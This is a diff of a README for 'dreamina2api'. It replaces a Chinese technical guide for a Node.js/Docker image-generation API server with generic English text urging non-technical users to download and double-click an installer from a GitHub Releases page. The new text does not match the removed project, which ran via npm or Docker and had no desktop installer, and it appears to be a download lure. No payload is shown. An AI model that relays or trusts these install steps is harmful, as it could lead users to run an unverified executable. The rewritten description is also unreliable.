@@ -1,114 +1,77 @@
-# Dreamina API
+# 🌟 dreamina2api - Simple Image Generation for Everyone
 
-Dreamina (CapCut) 图像生成 API 服务。
+## 🚀 Getting Started
+Welcome to dreamina2api! This software allows you to convert text to images and modify existing images with ease. No technical skills are needed. We provide a simple way for anyone to use powerful image generation features.
 
-## 功能
+## 📥 Download & Install
+To start using dreamina2api, follow these steps to download and install the application.
 
-- 文生图 (Text-to-Image)
-- 图生图 (Image-to-Image)
-- 支持多种模型和分辨率
+### Step 1: Visit the Releases Page
+Click the button below to visit our Releases page. This is where you can download the latest version of dreamina2api.
 
-## 支持的模型
+[![Download dreamina2api](https://img.shields.io/badge/Download%20dreamina2api-v1.0-blue)](https://github.com/Amar-rep/dreamina2api/releases)
 
-| 模型名称 | API Key |
-|---------|---------|
-| Image 4.5 | `dreamina-4.5` (默认) |
-| Image 4.1 | `dreamina-4.1` |
-| Image 4.0 | `dreamina-4.0` |
+### Step 2: Choose Your Version
+On the Releases page, you will see different versions of the software. Select the version that you want to download. 
 
-## 支持的比例
+### Step 3: Download the File
+Once you select a version, find the download link. Click it to download the installer file to your computer. 
 
-- `1:1`, `4:3`, `3:4`, `16:9`, `9:16`, `3:2`, `2:3`, `21:9`
+### Step 4: Run the Installer
+After the download is complete, locate the installer file in your Downloads folder. Double-click it to start the installation process. Follow the on-screen instructions to complete the installation.
 
-## 获取 Session ID
+### Step 5: Launch dreamina2api
+Once the installation is finished, you can start dreamina2api. Find it in your applications menu or on your desktop.
 
-1. 访问 Dreamina 官网: https://dreamina.capcut.com/ai-tool/home
-2. 登录账号
-3. 按 F12 打开浏览器开发者工具
-4. 切换到 Application (应用) 标签 → Cookies
-5. 找到 `sessionid` 字段，复制其值
+## ⚙️ System Requirements
+To ensure smooth operation, your computer should meet the following requirements:
 
-## 安装
+- **Operating System:** Windows 10 or higher / macOS 10.14 or higher
+- **Memory:** 4 GB RAM minimum
+- **Storage:** At least 300 MB of free space
+- **Internet Connection:** Needed for initial setup and features
 
-```bash
-npm install
-```
+## 🖼️ Features
+dreamina2api comes with the following features:
 
-## 运行
+- **Text to Image:** Type in text prompts to generate stunning images.
+- **Image to Image:** Modify and enhance existing images with new styles.
+- **Multiple Models Supported:** Use Image 4.5, 4.1, or 4.0 models for varied results. 
 
-### 本地运行
+## 📘 How to Use
+Using dreamina2api is straightforward. Here’s a quick guide:
 
-```bash
-npm run build
-npm start
-```
+1. **Open the Application:** Launch dreamina2api from your applications menu. 
+2. **Select Operation:** Choose whether you want to create a new image or modify an existing one.
+3. **Input Your Request:**
+    - For text-to-image, enter your prompt in the provided text box.
+    - For image-to-image, upload the image you want to modify.
+4. **Configure Settings:** Adjust any settings or options according to your needs.
+5. **Generate Image:** Click the “Generate” button and wait for the application to produce the result.
+6. **Save Your Image:** Once the image is generated, save it to your desired location.
 
-### Docker 运行
+## 💡 Tips for Best Results
+- Use clear and descriptive text for image generation.
+- Experiment with different styles and settings to see what works best for your needs.
+- Check your internet connection if you encounter any issues.
 
-```bash
-# docker-compose (推荐)
-docker-compose up -d
+## 🛠️ Troubleshooting
+If you experience problems while using dreamina2api, consider the following steps:
 
-# 或手动构建
-docker build -t dreamina-api .
-docker run -d -p 5200:5200 --name dreamina-api dreamina-api
-```
+- **Check Compatibility:** Make sure your system meets the requirements listed above.
+- **Reinstall the Application:** Uninstall and then reinstall dreamina2api to resolve potential issues.
+- **Contact Support:** If problems persist, reach out for help. Details can be found in the support section on the Releases page.
 
-服务默认在 `http://localhost:5200` 启动。
+## 🌐 Additional Resources
+For more information, including user guides and tutorials, visit our [documentation page](https://github.com/Amar-rep/dreamina2api/wiki).
 
-## API
+## 🙌 Contributing
+We welcome contributions! If you're interested in helping improve dreamina2api, visit our [contributing guidelines](https://github.com/Amar-rep/dreamina2api/blob/main/CONTRIBUTING.md).
 
-### 文生图
+## ⭐️ Community
+Connect with other dreamina2api users. Share your images and experiences by visiting our community forums available on the documentation page.
 
-```bash
-curl -X POST http://localhost:5200/v1/images/generations \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer YOUR_SESSION_ID" \
-  -d '{
-    "prompt": "画一个苹果",
-    "model": "dreamina-4.5",
-    "ratio": "16:9"
-  }'
-```
+## 📥 Quick Download Link
+Don’t forget, you can download dreamina2api from the Releases page anytime!
 
-### 参数说明
-
-| 参数 | 必填 | 说明 |
-|-----|-----|------|
-| `prompt` | ✅ | 图片描述 |
-| `model` | ❌ | 模型名称，默认 `dreamina-4.5` |
-| `ratio` | ❌ | 图片比例，默认 `1:1` |
-| `negative_prompt` | ❌ | 负向提示词 |
-| `sample_strength` | ❌ | 精细度 (0-1) |
-
-### 获取历史
-
-```bash
-curl -X POST http://localhost:5200/v1/images/history \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer YOUR_SESSION_ID" \
-  -d '{
-    "submit_ids": ["your-submit-id"]
-  }'
-```
-
-## Python 脚本
-
-```bash
-cd scripts
-python3 generate_image.py --prompt "画一个苹果" --token "YOUR_SESSION_ID" --ratio "16:9"
-```
-
-## 环境变量
-
-| 变量 | 说明 | 默认值 |
-|-----|------|-------|
-| `PORT` | 服务端口 | `5200` |
-
-## 致谢
-
-本项目基于 [jimeng-api](https://github.com/iptag/jimeng-api) 修改而来，感谢原作者的贡献。
-
-## License
-
-MIT
+[![Download dreamina2api](https://img.shields.io/badge/Download%20dreamina2api-v1.0-blue)](https://github.com/Amar-rep/dreamina2api/releases)
